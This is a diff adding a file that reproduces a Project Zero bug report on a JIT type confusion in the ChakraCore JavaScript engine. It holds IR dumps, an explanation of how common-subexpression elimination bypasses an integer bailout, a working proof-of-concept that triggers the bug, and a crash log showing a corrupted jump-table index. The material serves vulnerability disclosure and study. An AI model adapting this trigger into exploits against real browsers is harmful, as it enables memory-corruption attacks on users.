@@ -1,0 +1,234 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1341&desc=3
+
+Let's start with a switch statement and its IR code for JIT.
+
+JS:
+for (let i = 0; i <; 100; i++) {
+    switch (i) {
+        case 2:
+        case 4:
+        case 6:
+        case 8:
+        case 10:
+        case 12:
+        case 14:
+        case 16:
+        case 18:
+        case 20:
+        case 22:
+        case 24:
+        case 26:
+        case 28:
+        case 30:
+        case 32:
+        case 34:
+        case 36:
+        case 38:
+            break;
+    }
+}
+
+IRs before Type Specialization:
+    s26.var         =  Ld_A           s24.var - "i"                           #0011  Bailout: #0011 (BailOutExpectingInteger)
+                       BrLt_A         $L2, s26.var, s5.var                    #0070 
+$L9:                                                                          #0070  
+                       BrGt_A         $L2, s26.var, s23.var                   #0070 
+$L8:                                                                          #0070  
+    s28.var         =  Sub_A          s26.var, 2 (0x2).i32                    #0070  // Because of the minimum case is 2, subtracting 2 from i. s28 is a temporary variable.
+                       MultiBr        ..., s28.var #0070 
+
+IRs after Type Specialization:
+    s52(s26).i32    =  Ld_A           s51(s24).i32 - "i"                      #0011 
+                       BrLt_I4        $L2, s51(s24).i32, 2 (0x2).i32          #0070 
+$L9:                                                                          #0070  
+                       BrGt_I4        $L2, s51(s24).i32, 38 (0x26).i32        #0070 
+$L8:                                                                          #0070  
+    s53(s28).i32    =  Sub_I4         s51(s24).i32, 2 (0x2).i32               #0070 
+                       MultiBr        ..., s53(s28).i32! #0070 
+
+
+
+MultiBr instructions' offset operand(s28 in the above) must be of type Int32. If not, type confusion will occur. The way to ensure it is to use BailOutExpectingInteger.
+
+In the above code, "s26" is ensured to be of type Int32 by the bailout. So, the other variables affected by "s26" including the offset variable "s28" are also ensured to be of type Int32.
+
+What I noticed is "s28.var = Sub_A s26.var, 2 (0x2).i32". If we declare a variable "j" with "i - 2", the offset variable "s28" will be replaced with "j" in the CSE phase.
+
+JS:
+for (let i = 0; i < 100; i++) {
+    let j = i - 2;
+    switch (i) {
+        case 2:
+        case 4:
+        case 6:
+        case 8:
+        case 10:
+        case 12:
+        case 14:
+        case 16:
+        case 18:
+        case 20:
+        case 22:
+        case 24:
+        case 26:
+        case 28:
+        case 30:
+        case 32:
+        case 34:
+        case 36:
+        case 38:
+            break;
+    }
+}
+
+IR:
+  Line   3: let j = i - 2;
+  Col    9: ^
+                       StatementBoundary  #2                                  #0013 
+    s55(s28).i32    =  Sub_I4         s54(s24).i32, 2 (0x2).i32               #0013 
+
+
+  Line   4: switch (i) {
+  Col    9: ^
+                       StatementBoundary  #3                                  #001a  // BailOutExpectingInteger
+                       BrLt_I4        $L2, s54(s24).i32, 2 (0x2).i32          #0079 
+                       BrGt_I4        $L2, s54(s24).i32, 38 (0x26).i32        #0079 
+                       MultiBr        ..., s55(s28).i32! #0079 
+
+
+The offset variable is replaced with "j" that is not ensured to be of type Int32.
+
+CORRECTION: The bug was that it tried to ensure the type using BailOutExpectingInteger, even if "i" was not always of type Int32. It was bypassed with the CSE phase. So if we created a case where "j" couldn't be of type Int32, type confusion occurred.
+
+JS:
+for (let i = 0; i < 100; i++) {
+    let j = i - 2;
+    switch (i) {
+        case 2:
+        case 4:
+        case 6:
+        case 8:
+        case 10:
+        case 12:
+        case 14:
+        case 16:
+        case 18:
+        case 20:
+        case 22:
+        case 24:
+        case 26:
+        case 28:
+        case 30:
+        case 32:
+        case 34:
+        case 36:
+        case 38:
+            break;
+    }
+
+    if (i == 39)
+        i = 'aaaa';
+}
+
+IR:
+  Line   3: let j = i - 2;
+  Col    9: ^
+                       StatementBoundary  #2                                  #0013 
+    s30[LikelyCanBeTaggedValue_Int].var = Sub_A  s26[LikelyCanBeTaggedValue_Int_Number].var, 0x1000000000002.var #0013 
+    s27[LikelyCanBeTaggedValue_Int].var = Ld_A  s30[isTempLastUse][LikelyCanBeTaggedValue_Int].var! #0017 
+
+
+  Line   4: switch (i) {
+  Col    9: ^
+                       StatementBoundary  #3                                  #001a 
+    s63(s26).i32    =  FromVar        s26[LikelyCanBeTaggedValue_Int_Number].var #001a  Bailout: #001a (BailOutExpectingInteger)
+                       BrLt_I4        $L4, s63(s26).i32, 2 (0x2).i32          #0079 
+                       BrGt_I4        $L4, s63(s26).i32, 38 (0x26).i32        #0079 
+                       MultiBr        ..., s27[LikelyCanBeTaggedValue_Int].var #0079 
+
+
+It ended up to use "j" of type Var as the offset variable.
+
+PoC:
+*/
+
+function opt() {
+    for (let i = 0; i < 100; i++) {
+        let j = i - 2;
+        switch (i) {
+            case 2:
+            case 4:
+            case 6:
+            case 8:
+            case 10:
+            case 12:
+            case 14:
+            case 16:
+            case 18:
+            case 20:
+            case 22:
+            case 24:
+            case 26:
+            case 28:
+            case 30:
+            case 32:
+            case 34:
+            case 36:
+            case 38:
+                break;
+        }
+
+        if (i == 90) {
+            i = 'x';
+        }
+    }
+}
+
+function main() {
+    for (let i = 0; i < 100; i++) {
+        opt();
+    }
+}
+
+main();
+
+/*
+Crash Log:
+RAX: 0x1 
+RBX: 0x7ffff7e04824 --> 0x100000000 
+RCX: 0x3 
+RDX: 0x7ffff0b20667 (loope  0x7ffff0b2066d)
+RSI: 0x80000001 
+RDI: 0x7ffff0c182a0 --> 0x7ffff6478a10 --> 0x7ffff5986230 (<Js::DynamicObject::Finalize(bool)>: push   rbp)
+RBP: 0x7fffffff2130 --> 0x7fffffff21b0 --> 0x7fffffff2400 --> 0x7fffffff2480 --> 0x7fffffff24d0 --> 0x7fffffff52f0 (--> ...)
+RSP: 0x7fffffff20c0 --> 0x1111015500000002 
+RIP: 0x7ffff0b204da (mov    rdx,QWORD PTR [rdx+r13*8])
+R8 : 0x0 
+R9 : 0x0 
+R10: 0x7ffff0b20400 (movabs rax,0x555555879018)
+R11: 0x206 
+R12: 0x7fffffff5580 --> 0x7ffff0ba0000 --> 0xeb021a471b4f1a4f 
+R13: 0x1000000000001 << Var 1
+R14: 0x1000000000003 
+R15: 0x7ffff0c79040 --> 0x7ffff643c050 --> 0x7ffff5521130 (<Js::RecyclableObject::Finalize(bool)>:  push   rbp)
+EFLAGS: 0x10297 (CARRY PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x7ffff0b204cb:  cmp    ecx,0x26
+   0x7ffff0b204ce:  jg     0x7ffff0b204e1
+   0x7ffff0b204d0:  movabs rdx,0x7ffff0b20667
+=> 0x7ffff0b204da:  mov    rdx,QWORD PTR [rdx+r13*8]
+   0x7ffff0b204de:  rex.W jmp rdx
+
+We can simply think as follows.
+
+Before the CSE phase:
+Var j = ToVar(i - 2);
+int32_t offset = i - 2;
+jmp jump_table[offset];
+
+After the CSE phase:
+Var j = ToVar(i - 2);
+jmp jump_table[j];
+
+*/
